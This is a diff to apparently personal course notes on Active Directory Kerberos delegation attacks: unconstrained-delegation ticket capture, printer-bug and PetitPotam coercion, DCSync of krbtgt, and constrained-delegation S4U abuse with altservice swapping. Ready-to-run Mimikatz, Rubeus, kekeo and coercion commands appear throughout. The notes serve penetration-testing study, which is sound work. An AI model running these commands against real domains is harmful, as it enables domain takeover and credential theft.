@@ -221,7 +221,7 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\setspn
   * &#x20;1\. Unconstrained Delegation or General/Basic D. - allows the first hop server to request access to any service on any host in the domain as the user
   * &#x20;2\. Constrained Delegation - allows the first hop server to request access only to specified services on specific computers. If the user is not using Kerberos authentication to auth to the first hop server, Windows offers Protocol Transistoin to transit to the request to kerberos
 * Unconstrained Delegation:
-  * Allows the first hop server to request access to any service on any host in the domain as the user
+  * **Allows the first hop server to request access to any service on any host in the domain as the user**
   * When UD is enabled, the DC places user's TGT inside TGS,  see step 4. When presented to the server with UD, the TGT is extracted from TGS and stored in _**LSASS**_. So the server can reuse the users TGT to access resources.
   * **This could be used to escalate privileges in case we can compromise the computer with UD and a Domain Admin connects to that machine**
 
@@ -256,7 +256,7 @@ Get-AD-User -Filter {TrustedForDelegation -eq $true}
 
 ❓ Elevated/System priv. required or high integrity process!
 
-**2. Compromise the server where Unconstrained Delegation is enabled and get all the Kerberos Tokens (wait for admin user to connect?)**
+**2. Compromise the server where Unconstrained Delegation is enabled and get all the Kerberos Tokens - wait for admin user to connect or force it with Printerbug etc.**
 
 <pre class="language-powershell"><code class="lang-powershell">Compromise the server where Unconstrained Delegation is enabled, then
 <strong>Invoke-Mimikatz -command '"sekurlsa::ticket"'
@@ -287,9 +287,10 @@ Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket.kirbi"'
 
 Capture TGT of the dchost on the appserver host, then run MS-RPRN.exe ([https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample))
 
+{% code overflow="wrap" %}
 ```
-.\rubeus.exe monitor /interval:1 /nowrap
-MS-RPRN.exe \\dchost.dom.local \\appserver.dom.local  /on studentmachine
+.\rubeus.exe monitor /interval:1 /nowrap  //do that on unconstrained macihine
+MS-RPRN.exe \\dchost.dom.local \\appserver.dom.local    //do that on studentmachine
 
 Copy the base64 encoded TGT, remove extra spaces/crlf if any, and use it on another host
 .\rubeus.exe ptt /ticket:...
@@ -297,6 +298,7 @@ Copy the base64 encoded TGT, remove extra spaces/crlf if any, and use it on anot
 Run DCSync
 Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 ```
+{% endcode %}
 
 ## 🦛PetitPotam
 
@@ -305,9 +307,8 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 * PetitPotam uses EfsRpcOpenFileRaw function of MS EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC.See above
 
 ```powershell
-.\rubeus.exe monitor /interval:1 /nowrap
-PetitPotam.exe appserver-hostname dchostname
-
+.\rubeus.exe monitor /interval:1 /nowrap      //do that on unconstrained macihine
+PetitPotam.exe appserver-hostname dchostname  //do that on studentmachine
 ```
 
 ## ↙🎭 Kerberos Constrained Delegation&#x20;
@@ -318,6 +319,11 @@ PetitPotam.exe appserver-hostname dchostname
 * To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
   * Service for User to Self (S4U2self) - Allows a service to obtain a forwordable TGS to itself on behalf of a user, with just the user principal name without supplying a password. The service account mut have TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGTION (T2A4D) UserAccount attribute must be set for the service account. Only then the service can request a TGS for itself on behalf of the user by impersonating the user
   * Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute of the service account. This attribute contains a list of SPNs to which the user tokens can be forwarded.
+* ❗ **Problem 1**: If you can compromise the user account mentioned in Get-DomainUser -TrustedToAuth, you can access the service mentioned in msds-allowedtodleegateto as ANY user, including DA.
+* ❗**Problem 2**: The SPN part is not encrypted (Get-DomainUser -TrustedToAuth - msds-allowedtodelegateto attribute) - so you can change this service!\
+  So you can access all services on the target machine which us the same service account!!\
+  ❗=> check all other services http, cifs, host etc. when you only have like time service
+* ❗ No Request/Connection from DA to the Host is required!
 * Delegation not only occurs for the specified service but for any service running under the same account. There is no validation for the SPN specified.\
   This is huge as it allows to many interesting services when the delegation may be for a non-intrusive service!\
   ❗Eg. We have CIFS on appsrv.dom.local, we can access all the services, which use the same service account as CIFS, which is the machine account. This is also the account for WMI, PowershellRemoting!
@@ -326,6 +332,8 @@ PetitPotam.exe appserver-hostname dchostname
 
 ### Requirement
 
+* ❗ If you can compromise the account mentioned in Get-DomainUser -TrustedToAuth, you can access the service mentioned in msds-allowedtodleegateto as ANY user, including DA
+* ❗ No Request/Connection from DA to the Host is required!
 * Access to the service account - it is then possible to access services listed in the msDS-AllowedToDelegateTo as _**ANY**_ user, including Domain Administrators
 * No waiting
 * Compromised machine with high privileges shell or request a TGT for the machine account
@@ -336,9 +344,10 @@ PetitPotam.exe appserver-hostname dchostname
 
 {% code overflow="wrap" %}
 ```powershell
-Get-DomainUser -TrustedToAuth
-Get-DomainComputer -TrustedToAuth
+Get-DomainUser -TrustedToAuth      => For Useraccounts - Problem 1
+Get-DomainComputer -TrustedToAuth  => For Computeraccounts - Problem 2
 
+If result contains useraccountcontrol:Trusted_to_auth_for_delegation => this account can be used.
 ```
 {% endcode %}
 
@@ -348,11 +357,11 @@ With ActiveDirectory Module
 Get-ADObject -filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTO
 ```
 
-**❗Step 2 and 3 together (TGT & TGS)**
+**❗Problem 1: Step 2, 3, 4 together (TGT & TGS) with Rubeus**
 
 {% code overflow="wrap" %}
 ```
-rubeus.exe s4u /user:username /aes256:hash /impersonateuser:Administrator /msdsspn:CIFS/dc.dom.loacl /ptt
+rubeus.exe s4u /user:username-with-constrained-delegation-enabled-user-or-machine-acc /aes256:hash /impersonateuser:Administrator /msdsspn:CIFS/dc.dom.loacl /ptt
 ```
 {% endcode %}
 
@@ -362,7 +371,7 @@ rubeus.exe s4u /user:username /aes256:hash /impersonateuser:Administrator /msdss
 </strong><strong>kekeo# tgt::ask /user:serviceusername /domain:dom.local /rc4:rc4hash
 </strong></code></pre>
 
-Kekeo can read/write tickets without injecting into lsass and without having adminprivileges.
+Kekeo can read/write tickets without injecting into lsass and without having admin privileges.
 
 **3. Once we have t TGT,  using s4u from keko, we can request a TGS (step 4 and 5 in diagram)**
 
@@ -380,7 +389,7 @@ Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
 ls \\host.dom.local\c$
 ```
 
-**If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused. Kekeo, we request a TGT and then a TGS**
+**Problem 2: Machine Account$ is used - If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused.user** &#x20;
 
 {% code overflow="wrap" %}
 ```powershell
@@ -390,7 +399,7 @@ tgs::s4u /tgt:filename.kirbi /user:Administrator@dom.local /service:time/dom.loc
 => We also request LDAP Access as Administrator, which runs under the same service account as the regular time service
 
 Same with rubeus in one command:
-Rubeus.exe s4u /user:machine-user$ /aes256:.... /impersonateuser:Administrator /msdsspn:time/dom.local /altservice:ldap /ptt
+Rubeus.exe s4u /user:machine-account-with-CD$ /aes256:.... /impersonateuser:Administrator /msdsspn:time/dom.local(what is shown in  Get-DomainComputer -TrustedToAuth)  /altservice:ldap /ptt
 ```
 {% endcode %}
 
